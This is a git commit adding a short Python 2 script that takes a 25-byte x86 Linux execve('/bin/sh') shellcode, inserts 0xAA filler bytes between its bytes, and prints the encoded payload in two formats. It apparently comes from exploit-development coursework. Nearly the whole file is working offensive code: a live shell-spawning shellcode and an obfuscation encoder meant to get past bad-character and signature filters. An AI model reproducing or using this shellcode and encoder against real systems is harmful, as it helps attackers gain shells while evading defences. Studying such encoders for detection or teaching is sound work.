096f7064a3af0a090bc125cc7099c3c91cd192d7
nikhil-polymath <nagasainikhil100@gmail.com>
2020-05-17 19:49:02 +0530

    Add files via upload

---
+++ insertion-encoder.py
@@ -0,0 +1,26 @@
+
+import random
+
+# Execve /bin/sh (25 bytes)
+shellcode =("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode...'
+
+for x in bytearray(shellcode):
+	# Insertion Encoding
+	encoded += '\\x'
+	encoded += '%02x' % x
+	encoded += '\\x%02x' % 0xAA
+	# encoded += '\\x%02x' % random.randint(1,255)
+
+	encoded2 += '0x'
+	encoded2 += '%02x,' % x
+	encoded2 += '0x%02x,' % 0xAA
+	# encoded2 += '0x%02x' % random.randint(1,255)
+
+print encoded +"\n"
+print encoded2
+print 'Len: %d' % len(bytearray(shellcode))
